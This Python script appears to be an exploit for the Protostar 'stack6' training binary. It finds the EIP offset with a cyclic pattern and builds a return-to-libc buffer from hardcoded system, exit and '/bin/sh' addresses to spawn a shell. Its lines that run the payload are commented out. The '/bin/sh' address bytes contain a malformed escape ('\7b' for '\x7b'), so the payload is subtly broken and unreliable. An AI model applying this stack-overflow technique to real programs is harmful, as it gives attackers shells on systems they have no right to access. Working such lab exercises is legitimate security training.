#!/usr/bin/python

import commands

# Path to binary
command = '/opt/protostar/bin/stack6'

# Pattern to find EIP - 128 bytes
pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae'
# EIP found at 37634136, offset at 80

# system found at 0xb7ecffb0
sys_addr = "\xb0\xff\xec\xb7"

# exit found at 0xb7ec60c0
exit_addr = "\xc0\x60\xec\xb7"

# /bin/sh found out 0xbfffff7b
sh_addr = "\7b\xff\xff\xbf"

# Create new file write buffer to file
file = open('buffer', 'w+')
buffer = 'A'*80 + sys_addr + exit_addr + sh_addr
file.write(buffer)
file.close()

# String to execiute command and send buffer file as input
line = command + " < buffer"

# Execute the command with the current buffer
#output = commands.getoutput(line)
#print(output)
